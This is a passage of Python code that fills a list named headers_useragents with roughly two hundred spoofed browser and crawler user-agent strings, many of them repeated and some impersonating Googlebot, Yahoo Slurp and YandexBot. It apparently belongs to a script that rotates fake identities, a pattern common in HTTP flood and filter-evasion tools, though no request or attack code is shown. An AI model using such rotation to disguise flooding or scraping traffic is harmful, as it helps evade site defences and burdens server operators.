        'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)')
    headers_useragents.append(
        'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)')
    headers_useragents.append(
        'Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
    headers_useragents.append(
        'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1')
    headers_useragents.append(
        'Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)')
    headers_useragents.append(
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A')
    headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 3.55)')
    headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 2.00)')
    headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 1.00)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)')
    headers_useragents.append(
        'SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)')
    headers_useragents.append(
        'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
    headers_useragents.append(
        'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)')
    headers_useragents.append(
        'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
    headers_useragents.append(
        'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append(
        'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
    headers_useragents.append(
        'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
    headers_useragents.append(
        'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
    headers_useragents.append(
        'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
    headers_useragents.append(
        'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
    headers_useragents.append(
        'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
    headers_useragents.append(
        'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    headers_useragents.append(
        'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
    headers_useragents.append(
        'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
    headers_useragents.append(
        'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
    headers_useragents.append(
        'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
    headers_useragents.append(
        'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
    headers_useragents.append(
        'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
    headers_useragents.append(
        'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
    headers_useragents.append(
        'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
    headers_useragents.append(
        'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
    headers_useragents.append(
        'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
    headers_useragents.append(
        'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
    headers_useragents.append(
        'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
    headers_useragents.append(
        'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
    headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
    headers_useragents.append(
        'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
    headers_useragents.append(
        'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
    headers_useragents.append(
        'Googlebot/2.1 (http://www.googlebot.com/bot.html)')
    headers_useragents.append('Opera/9.20 (Windows NT 6.0; U; en)')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)')
    headers_useragents.append(
        'Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
    headers_useragents.append(
        'YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
    headers_useragents.append(
        'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    headers_useragents.append(
        'AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append(
        'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
    headers_useragents.append(
        'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
    headers_useragents.append(
        'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
    headers_useragents.append(
        'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
    headers_useragents.append(
        'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
    headers_useragents.append(
        'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
    headers_useragents.append(
        'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    headers_useragents.append(
        'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
    headers_useragents.append(
        'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
    headers_useragents.append(
        'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
    headers_useragents.append(
        'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
    headers_useragents.append(
        'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
    headers_useragents.append(
        'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
    headers_useragents.append(
        'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
    headers_useragents.append(
        'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
    headers_useragents.append(
        'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
    headers_useragents.append(
        'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
    headers_useragents.append(
        'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
    headers_useragents.append(
        'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
    headers_useragents.append(
        'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
    headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
    headers_useragents.append(
        'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
    headers_useragents.append(
        'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append(
        'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
    headers_useragents.append(
